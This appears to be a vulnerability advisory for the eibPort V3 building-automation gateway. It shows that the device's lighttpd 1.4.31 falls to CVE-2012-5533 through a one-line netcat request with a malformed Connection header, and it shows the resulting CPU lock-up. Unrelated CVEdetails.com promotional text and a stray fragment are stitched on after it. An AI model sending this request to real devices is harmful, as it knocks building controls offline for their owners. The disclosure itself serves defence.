* Vendor: BAB TECHNOLOGIE GmbH
* Product: eibPort V3
* Vendor contacted: 12.08.2020

# Background

From [vendor’s website](https://bab-technologie.com/eibport/?lang=en):

The EIBPORT connects KNX or EnOcean building control with the IP world.

[…]

Whether simple or complex – use over 50 integrated services for almost all automation tasks in building automation. Program your own control sequences with the graphical LOGIKEDITOR or integrate third-party applications such as Amazon® Alexa.
[…]

Via a secure connection, you can also control and maintain the EIBPORT remotely.
[…]

On request, the EIBPORT also functions as an IP router in the KNX installation and as a programming interface to the ETS.

[…]

# Issue Description

Connecting to eibPort URL shows HTTP header `Server: lighttpd/1.4.31`

After a search for already known CVE entries, the lighttpd process proved to be susceptible because of [CVE-2012-5533](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2012-5533=CVE-2012-5533).

This vulnerability can be exploited by unauthenticated attackers with access to the web interface:

```
echo -ne "GET / HTTP/1.1\r\nHost: 1.2.3.4\r\nConnection: TC,,Keep-Alive\r\n\r\n" | nc 1.2.3.4 80

```

After that the lighttpd is permanently in 99% CPU load and the eibPort does not react anymore, because the resources are used up:

```
PID  PPID USER     STAT   VSZ %VSZ %CPU COMMAND
  321     1 root     R     5548   2%  99% /usr/sbin/lighttpd -f /etc/lighttpd/lighttpd.conf

```

Just a restart of lighttpd process seems to be not enough to fix the overload condition, a reboot is required.

All researchers.

me, but I simply scanned known CVEs to use them and lighttpd/1.4.31 is a low hanging fruit in IoT devices.

### Vulnerability intelligence and core features

CVEdetails.com offers a complete **CVE database** enhanced with additional information including advisories, exploits, tools,
source code changes and much more.

[CVEs in CISA KEV](/cisa-known-exploited-vulnerabilities/kev-1.html "Known exploited vulnerabilities by CISA") catalog
give users quick access to a list of **vulnerabilities exploited in the wild**.

[EPSS scores](/epss/epss-score-history.html?delta=110 "EPSS scores for CVEs") provides users with a list of vulnerabilities
with increased risk.

Set up email alerts for new CVEs or when new exploits are discovered for CVEs. Or create CVE feeds which can be integrated with tools like Slack or Outlook.
Or use our APIs to query CVEs, exploits and other data.

Get an overview of your **external attack surface**, and products/services running on your IPs.

Create your own tech stacks to manage vulnerabilities affecting products you use. **Analyze SBOM** files and report vulnerabilities affecting dependencies in the SBOM file.

### CVEs and CPE information

CVEdetails.com provides CPE information for most CVEs, even if they are not provided by NVD.
Unfortunately NVD is no longer a reliable source of CVE information and CVEdetails.com compansates this issue
by automated and manual analysis. Even if NVD was completely shutdown CVEdetails.com can continue providing CVE information with CPEs.

CVEdetails.com analyzes CVEs even if CPE information is available from **CISA Vulnrichment** project.
Unfortunately CPEs provided by CISA Vulnrichment are not always accurate so we do our own analysis without assuming CPE information provided
by CISA Vulnrichment is correct.

CVEdetails.com selectively analyzes CVEs and focuses on CVEs affecting enterprise software or widely used software.
We do not do manual analysis for CVEs related to software from certain sources such as SourceCodester, code-projects, itsourcecode
and other less popular sources such as personal github repositories with minimal users.

##### The new CVEdetails.com

CVEdetails.com now offers much more than just CVEs!
Advisories, exploits, RSS feeds and various other vulnerability intelligence features have been added
along with APIs, email alerts, feeds and more.

We want to save our users from Googling for information!
We want to make our users
more efficient and productive by providing them with easy access to information and the necessary utilities.

We want to become your one-stop shop for anything related to vulnerabilities.
Instead of using 20 different tools and 50 web sites, you should only need CVEdetails.

See [updates and change log](/documentation/news-updates) for more information.

Feel free to reach us at **admin@cvedetails.com** if you have any questions/concerns or feedback.

##### Why do you need vulnerability intelligence?

Using a house analogy, your house have many doors and windows, and there will always be burglars and other parties with bad intentions outside.

To secure your house, you first need to know
how many windows and doors you have (**attack surface**), if your doors and windows are secured properly
and if they can be opened due to some defects in your locks or similar (**vulnerability intelligence**).

Existence of burglars in your neighbourhood or whether burglars are targeting specific lock types etc (threat intelligence)
won't help much unless you keep your house secure. Even if you track every single known burglar, given the opportunity, some random
person, even without prior experience, may break into your house.

We understand that you need to keep up with everything with limited time and resources! We are here to make life easier for you.
